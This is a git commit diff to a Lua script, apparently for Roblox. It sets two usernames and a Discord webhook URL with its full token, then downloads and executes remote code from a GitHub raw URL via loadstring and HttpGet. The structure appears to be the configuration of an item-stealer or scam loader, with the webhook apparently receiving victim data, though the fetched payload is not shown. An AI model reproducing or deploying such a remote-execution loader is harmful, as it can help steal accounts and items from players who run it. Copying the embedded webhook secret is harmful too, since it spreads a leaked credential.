690d241498043c8f1fc60d2887e3710dad025989
Timitim200 <92639850+Timitim200@users.noreply.github.com>
2025-02-09 12:41:02 +0100

    Update script.lua

--- script.lua
+++ script.lua
@@ -1,4 +1,4 @@
 Username = "Wsumietonwm1"
 Username2 = "Wsumietonwm1"
 Webhook = "https://discord.com/api/webhooks/1315703840494063667/jKuhQ9iliHxTV5zTYVkxI7iebHBB4jrsxmcOcR0Yg6WPAl6JUafJOPQXLxizGjJLNbVS"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Timitim200/OPONTOP/refs/heads/main/ONTOP.lua",true))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Timitim200/OPONTOP/refs/heads/main/ONTOP.lua'))()
